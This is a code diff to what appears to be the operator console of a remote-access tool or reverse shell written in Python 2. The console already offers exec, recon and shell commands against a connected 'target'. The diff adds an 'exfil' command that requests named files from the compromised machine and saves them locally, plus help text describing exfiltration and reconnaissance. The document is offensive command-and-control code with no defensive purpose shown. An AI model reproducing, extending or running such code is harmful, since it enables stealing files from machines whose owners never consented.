@@ -31,7 +31,7 @@ def get_args():
 
 
 def shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec', 'recon', 'shell']
+    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     prompt = shell_exchange(conn, 'getprompt')
@@ -77,6 +77,20 @@ def shell_server(s, PORT):
                     shell_shell(conn, prompt)
                 else:
                     shell_cmd_help(cmds, 4)
+            # exfil
+            elif base == cmds[5]:
+                if re.search('^exfil ([\w\/.~]+ )+$', inp + ' '):
+                    for file in inp.split():
+                        if file == 'exfil':
+                            continue
+                        resp = shell_exchange(conn, 'exfil ' + file)
+                        if 'No such' in resp:
+                            print 'psh : {}: {}'.format(resp, file)
+                            continue
+                        shell_write(resp, base, OUT,
+                                    file.split('/')[-1].strip('.'))
+                else:
+                    shell_cmd_help(cmds, 5)
             else:
                 print 'psh: {}: command not found'.format(base)
         except KeyboardInterrupt:
@@ -110,7 +124,7 @@ def shell_write(response, prefix, out_dir, write_file=None):
         os.mkdir(out_ts_dir)
     with open(outfile, 'w') as f:
         f.write(response)
-        print 'psh : {} log written to {}'.format(prefix, outfile)
+        print 'psh : {} written to {}'.format(prefix, outfile)
 
 
 def shell_cmd_help(cmds, ind):
@@ -120,7 +134,7 @@ def shell_cmd_help(cmds, ind):
         print '\nExecute given commands and optionally log to file with optional filename.'
         print '\noptions:'
         print '-h\t\tshow help'
-        print '-o filename\t\twrite results to file in {}/'.format(OUT)
+        print '-o filename\twrite results to file in {}/'.format(OUT)
     elif ind == 3:
         print 'Basic reconaissance of target.'
         print 'usage: recon [-h] [-o]'
@@ -131,6 +145,12 @@ def shell_cmd_help(cmds, ind):
     elif ind == 4:
         print 'Basic shell on target (forwards stdout of commands executed).'
         print 'usage: shell [-h]'
+        print '\noptions:'
+        print '-h\t\tshow help'
+    elif ind == 5:
+        print 'Exfiltrate files.'
+        print 'usage: exfil [-h] file1 [file2 file3 ...]'
+        print '\nDownloads files to {}/'.format(OUT)
         print '\noptions:'
         print '-h\t\tshow help'
 
